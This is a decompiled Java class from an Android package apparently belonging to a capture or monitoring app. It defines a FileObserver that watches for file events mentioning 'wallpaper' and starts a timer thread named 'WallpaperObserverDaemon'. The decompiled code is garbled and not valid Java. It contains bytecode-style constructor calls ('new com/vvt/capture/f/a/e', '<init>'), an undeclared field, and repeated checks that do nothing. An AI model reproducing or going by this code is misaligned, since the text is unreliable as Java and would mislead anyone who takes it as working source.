package com.vvt.capture.f.a;

import android.os.FileObserver;
import com.vvt.aj.a;

class d
  extends FileObserver
{
  private a b;
  
  public d(c paramc, String paramString, int paramInt)
  {
    super(paramString, paramInt);
  }
  
  public void onEvent(int paramInt, String paramString)
  {
    boolean bool = c.b();
    if (bool) {}
    bool = c.b();
    if (bool) {}
    bool = c.b();
    if ((!bool) || (paramString == null))
    {
      bool = c.c();
      if (!bool) {}
    }
    for (;;)
    {
      return;
      Object localObject1 = "wallpaper";
      bool = paramString.contains((CharSequence)localObject1);
      if (!bool)
      {
        bool = c.c();
        if (!bool) {
          continue;
        }
        continue;
      }
      localObject1 = this.a;
      synchronized (c.a((c)localObject1))
      {
        localObject1 = this.b;
        if (localObject1 == null)
        {
          localObject1 = new com/vvt/capture/f/a/e;
          String str = "WallpaperObserverDaemon";
          long l = 30;
          ((e)localObject1).<init>(this, str, l);
          this.b = ((a)localObject1);
          localObject1 = this.b;
          str = "WallpaperObCountDownTimer";
          ((a)localObject1).setName(str);
          localObject1 = this.b;
          ((a)localObject1).start();
        }
        bool = c.b();
        if (!bool) {
          continue;
        }
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/f/a/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */